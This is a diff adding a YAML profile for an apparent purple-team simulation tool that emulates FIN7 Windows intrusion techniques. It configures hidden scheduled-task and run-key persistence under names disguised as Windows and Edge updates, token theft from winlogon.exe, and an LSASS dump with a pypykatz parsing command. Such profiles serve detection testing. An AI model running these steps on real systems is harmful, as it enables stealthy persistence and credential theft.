@@ -1,0 +1,47 @@
+# FIN7-inspired purple-team simulation profile
+#
+# Emulates the group's typical Windows intrusion pattern:
+#   Phase 1 – Establish multiple persistence mechanisms then wait (dwell time)
+#   Phase 2 – Privilege escalation to SYSTEM + credential harvesting
+#
+# Usage:
+#   sim.exe --profile profiles/fin7.yaml --dry-run   # review plan
+#   sim.exe --profile profiles/fin7.yaml             # execute (elevated cmd)
+#
+# ATT&CK coverage: T1053.005, T1547.001, T1134.001, T1003.001
+
+name: fin7
+
+phases:
+
+  - label: Persistence
+    # Simulate APT dwell time between initial access and post-exploitation.
+    # Set to a shorter value (e.g. 30s) for lab runs.
+    sleep: 48h
+    enabled: true
+    ttps:
+
+      - ttp: schtask
+        task_name: MicrosoftEdgeUpdateCore
+        payload_path: "C:\\Temp\\payload.exe"
+        use_xml: true            # registers as Hidden; harder to spot in taskschd.msc
+
+      - ttp: registry-run-key
+        hive: hkcu               # no admin required
+        value_name: WindowsUpdateHelper
+        payload_path: "C:\\Temp\\payload.exe"
+
+  - label: Post-Exploitation
+    sleep: 0s
+    enabled: true
+    ttps:
+
+      - ttp: token-steal
+        target_exe: winlogon.exe  # reliable SYSTEM token source
+        spawn_exe: "C:\\Windows\\System32\\cmd.exe"
+        enable_se_debug: true
+
+      - ttp: lsass-dump
+        output_path: "C:\\Temp\\lsass.dmp"
+        enable_se_debug: true
+        # Parse offline: pypykatz lsa minidump C:\Temp\lsass.dmp
